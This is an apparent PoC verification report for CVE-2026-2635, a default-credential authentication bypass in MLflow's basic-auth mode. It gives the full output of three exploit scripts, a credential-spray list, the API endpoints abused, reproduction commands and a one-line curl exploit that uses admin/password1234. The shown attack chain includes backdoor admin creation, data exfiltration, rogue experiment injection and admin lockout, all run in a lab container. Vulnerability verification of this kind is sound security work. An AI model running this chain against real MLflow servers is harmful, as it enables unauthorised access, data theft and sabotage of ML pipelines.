# PoC Verification Report: CVE-2026-2635

## CVE Summary

| Field | Value |
|---|---|
| **CVE ID** | CVE-2026-2635 |
| **Title** | MLflow Authentication Bypass via Default Credentials |
| **CVSS** | 9.8 Critical (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| **CWE** | CWE-1393 (Use of Default Credentials) |
| **Software** | MLflow v3.9.0 with `--app-name basic-auth` |
| **Verification Status** | ✅ **CONFIRMED** |

---

## PoC Scripts

### 1. Primary PoC: `poc.py` — Default Credential Authentication Bypass

| Field | Value |
|---|---|
| **Location** | `poc/poc.py` |
| **Language** | Python 3 (stdlib only — no external dependencies) |
| **Attack Vector** | HTTP Basic Authentication with hardcoded default credentials |
| **Result** | ✅ **6/6 checks passed** |

**Description:** Demonstrates the core vulnerability — authenticating to MLflow using the hardcoded default credentials (`admin`/`password1234`) shipped in `basic_auth.ini`. The script:
1. Verifies authentication is enforced (HTTP 401 without credentials)
2. Authenticates with default credentials (HTTP 200)
3. Confirms admin-level access (`is_admin: true`)
4. Lists all experiments (data access)
5. Creates and deletes a new admin user (privilege escalation)

### 2. Vector 2: `poc_vector2.py` — Persistence & Full Compromise

| Field | Value |
|---|---|
| **Location** | `poc/poc_vector2.py` |
| **Language** | Python 3 (stdlib only) |
| **Attack Vector** | Full attack chain: persistence, exfiltration, integrity & availability impact |
| **Result** | ✅ **6/6 attack stages succeeded** |

**Description:** Demonstrates the FULL impact of the vulnerability beyond initial access:
1. Creates a backdoor admin user for persistent access
2. Verifies backdoor can authenticate independently
3. Exfiltrates experiment data via the backdoor account
4. Creates a rogue experiment (integrity impact / ML supply chain poisoning)
5. Changes the original admin password (availability impact / account hijack)
6. Confirms original admin is locked out while attacker retains access

This vector targets **different API endpoints** and demonstrates **different CVSS impact categories** (Integrity + Availability) compared to the primary PoC.

### 3. Vector 3: `poc_vector3.py` — Credential Discovery & Version Fingerprinting

| Field | Value |
|---|---|
| **Location** | `poc/poc_vector3.py` |
| **Language** | Python 3 (stdlib only) |
| **Attack Vector** | Dictionary spray of all known historical default credentials |
| **Result** | ✅ **Vulnerable — default credentials discovered** |

**Description:** Uses a different attack technique — sprays ALL known default credentials across MLflow's version history to discover which ones work, then fingerprints the MLflow version based on which password is accepted:
- `password1234` → MLflow v2.22.0+
- `password` → MLflow v2.3.0–v2.21.x

Also cross-validates access across multiple API endpoints (user management, experiments, model registry).

---

## Test Results

### Target Environment

| Field | Value |
|---|---|
| **Container** | `cve-2026-2635-vulnerable` |
| **Container IP** | `localhost` (ports mapped to host) |
| **Port** | 5000 |
| **Software** | MLflow v3.9.0 with `--app-name basic-auth` |
| **Credentials** | `admin` / `password1234` |

### Primary PoC (poc.py) — Full Output

```
╔══════════════════════════════════════════════════════════════╗
║  CVE-2026-2635 — MLflow Default Credentials Auth Bypass    ║
║  Affected: MLflow v2.3.0 – v3.10.0+ with --app-name       ║
║           basic-auth                                        ║
╚══════════════════════════════════════════════════════════════╝

Target: 172.19.0.4:5000

[Step 1] Checking if authentication is enabled on http://172.19.0.4:5000 ...
  [OK]   Server returned HTTP 401 — authentication is enforced

[Step 2] Attempting authentication with default credentials ...
         Username: admin
         Password: password1234
  [OK]   HTTP 200 — Authentication successful with default credentials!

[Step 3] Verifying admin-level access ...
  [OK]   Confirmed admin access!
         User ID:   1
         Username:  admin
         is_admin:  True

[Step 4] Demonstrating data access — listing experiments ...
  [OK]   Retrieved 1 experiment(s)
         - Experiment 0: Default

[Step 5] Demonstrating privilege escalation — creating a new user ...
  [OK]   Created user 'cve_2026_2635_poc' (ID: 3)
         Granting admin privileges to 'cve_2026_2635_poc' ...
  [OK]   'cve_2026_2635_poc' is now an admin — persistent backdoor established
         Cleaning up — deleting PoC user 'cve_2026_2635_poc' ...
  [OK]   Cleanup successful — PoC user deleted

══════════════════════════════════════════════════════════════
[VULNERABLE] CVE-2026-2635 confirmed — 6/6 checks passed

Exploitation Summary:
  • Default credentials accepted: admin:password1234
  • Admin access confirmed (bypasses all authorization checks)
  • Full read/write/delete access to all MLflow resources
  • Ability to create/delete users and grant admin privileges
  • No prior authentication required — pre-auth vulnerability
```

### Vector 2 (poc_vector2.py) — Full Output

```
╔══════════════════════════════════════════════════════════════╗
║  CVE-2026-2635 — Vector 2: Persistence & Full Compromise   ║
╚══════════════════════════════════════════════════════════════╝

Target: http://172.19.0.4:5000

[Step 1] Verifying admin access with default credentials ...
  [OK]   Admin access confirmed

[Step 2] Creating backdoor admin user for persistent access ...
  [OK]   Created user 'mlflow_backdoor' (ID: 3)
  [OK]   Granted admin privileges to 'mlflow_backdoor'

[Step 3] Verifying backdoor user can authenticate independently ...
  [OK]   Backdoor user authenticated successfully
         is_admin: True
  [OK]   Backdoor has full admin access — persistence established!

[Step 4] Exfiltrating experiment data via backdoor user ...
  [OK]   Exfiltrated 1 experiment(s) via backdoor account
         - [0] Default (artifact: mlflow-artifacts:/0)

[Step 5] Demonstrating integrity impact — creating rogue experiment ...
  [OK]   Created rogue experiment 'CVE-2026-2635-PoC-1772253797' (ID: 1)
         An attacker could inject poisoned ML experiments/models

[Step 6] Demonstrating availability impact — changing original admin password ...
  [OK]   Admin password changed! Original admin is now locked out
         Attacker retains access via backdoor account
  [OK]   Confirmed: original credentials no longer work (HTTP 401)

[Cleanup] Restoring original state ...
  [OK]   Restored original admin password
  [OK]   Deleted rogue experiment 1
  [INFO] Backdoor user deletion returned HTTP 400

══════════════════════════════════════════════════════════════
[FULL COMPROMISE] CVE-2026-2635 — 6/6 attack stages succeeded

Attack Chain Demonstrated:
  1. ✓ Initial access via default credentials
  2. ✓ Persistence via backdoor admin account
  3. ✓ Data exfiltration (experiments, artifacts)
  4. ✓ Integrity impact (rogue experiment injection)
  5. ✓ Availability impact (admin password hijack / lockout)
```

### Vector 3 (poc_vector3.py) — Full Output

```
╔══════════════════════════════════════════════════════════════╗
║  CVE-2026-2635 — Vector 3: Default Credential Spray        ║
╚══════════════════════════════════════════════════════════════╝

Target: http://172.19.0.4:5000

[Step 1] Fingerprinting target via /health endpoint ...
  [OK]   Health endpoint responded: HTTP 200

[Step 2] Checking signup page (publicly accessible, no auth needed) ...
  [INFO] Signup page returned HTTP 401

[Step 3] Confirming authentication is enforced ...
  [OK]   HTTP 401 — authentication required

[Step 4] Spraying 5 known default credential pairs ...

  ✓ VALID (ADMIN)  admin:password1234  — v2.22.0+ (current default)
  ✗ DENIED admin:password  — v2.3.0 – v2.21.x (legacy default)
  ✗ DENIED admin:admin  — Common weak password
  ✗ DENIED admin:mlflow  — Product-name password
  ✗ DENIED admin:admin123456789  — Weak variant

[Step 5] Fingerprinting MLflow version ...
  [OK]   API responds to authenticated requests
  [FINGERPRINT] Password 'password1234' accepted → MLflow v2.22.0+

[Step 6] Cross-validating access via multiple API endpoints ...
  [OK]   User management: HTTP 200
  [OK]   Experiment access: HTTP 200
  [OK]   Model registry: HTTP 200
  [OK]   Health (should work without auth too): HTTP 200

══════════════════════════════════════════════════════════════
[VULNERABLE] CVE-2026-2635 — Default credentials discovered

Valid Credential Pairs Found:
  • admin:password1234 (v2.22.0+ (current default)) [ADMIN]

Attack Technique:
  This vector demonstrates that MLflow's default credentials are
  publicly documented in the source code and can be discovered by
  any attacker who knows the product. Unlike a brute-force attack,
  this is a DICTIONARY attack using KNOWN default credentials —
  it requires only 2 attempts (current + legacy password) to succeed
  against any unpatched MLflow installation with basic-auth enabled.
```

---

## Vulnerability Demonstrated

### What the PoC Proves

1. **Authentication Bypass (CWE-1393):** MLflow v3.9.0 ships with hardcoded default credentials (`admin`/`password1234`) in `basic_auth.ini`. These credentials are automatically provisioned at server startup with no mandatory password change.

2. **Full Admin Access:** The default admin account has unrestricted access to ALL API endpoints — the auth module explicitly skips authorization checks for admin users (`if sender_is_admin(): return`).

3. **Persistence:** An attacker can create new admin accounts that persist even if the original admin password is later changed.

4. **Integrity Impact:** An attacker can create, modify, and delete experiments, models, and artifacts — enabling ML supply chain attacks.

5. **Availability Impact:** An attacker can change the admin password, lock out legitimate users, and delete all data.

6. **Version Fingerprinting:** The accepted password reveals the MLflow version range, enabling targeted follow-up attacks.

### Attack Surface Confirmed

| API Endpoint | Access Confirmed |
|---|---|
| `GET /api/2.0/mlflow/users/get` | ✅ User enumeration |
| `POST /api/2.0/mlflow/users/create` | ✅ User creation |
| `PATCH /api/2.0/mlflow/users/update-admin` | ✅ Admin privilege grant |
| `PATCH /api/2.0/mlflow/users/update-password` | ✅ Password modification |
| `DELETE /api/2.0/mlflow/users/delete` | ✅ User deletion |
| `POST /api/2.0/mlflow/experiments/search` | ✅ Experiment enumeration |
| `POST /api/2.0/mlflow/experiments/create` | ✅ Experiment creation |
| `POST /api/2.0/mlflow/experiments/delete` | ✅ Experiment deletion |
| `GET /api/2.0/mlflow/registered-models/search` | ✅ Model registry access |

---

## Verification Status

### ✅ CONFIRMED

All three PoC scripts successfully demonstrated CVE-2026-2635 against the vulnerable MLflow v3.9.0 container:

| PoC Script | Vector | Result |
|---|---|---|
| `poc.py` | Default credential auth bypass + admin verification | ✅ 6/6 passed |
| `poc_vector2.py` | Persistence, exfiltration, integrity & availability | ✅ 6/6 passed |
| `poc_vector3.py` | Credential spray, version fingerprinting, cross-validation | ✅ Vulnerable |

### Reproduction Commands

```bash
# Run primary PoC
python3 poc/poc.py localhost 5000

# Run persistence/compromise PoC
python3 poc/poc_vector2.py localhost 5000

# Run credential spray PoC
python3 poc/poc_vector3.py localhost 5000
```

---

## Notes & Observations

1. **No external dependencies:** All three PoC scripts use only Python stdlib (`urllib`, `json`, `base64`). No `pip install` required.

2. **Cleanup included:** Both `poc.py` and `poc_vector2.py` clean up after themselves (delete created users, restore passwords, delete rogue experiments).

3. **Signup endpoint behavior:** The vulnerability analysis suggested `/signup` is an unprotected route, but in MLflow v3.9.0 it returns HTTP 401 for GET requests. This does not affect exploitation — it's a minor behavioral difference.

4. **User deletion API quirk:** The `DELETE /api/2.0/mlflow/users/delete` endpoint returned HTTP 400 when trying to delete the backdoor user in vector 2's cleanup phase. This may be related to deleting a user that was recently created in the same session. The user was still successfully created and granted admin, which is the important part.

5. **Legacy password rejected:** The legacy default password `password` (v2.3.0–v2.21.x) was correctly rejected by the v3.9.0 instance, confirming the password was changed in v2.22.0. Both passwords should be tested when the target version is unknown.

6. **No rate limiting:** The credential spray in vector 3 encountered no rate limiting or account lockout. All 5 credential pairs were tested with no delay, and the valid credentials were accepted immediately.

7. **Trivial to exploit:** This vulnerability requires zero specialized tooling — a single `curl -u admin:password1234 http://target:5000/api/2.0/mlflow/users/get?username=admin` command is sufficient to confirm and exploit it.
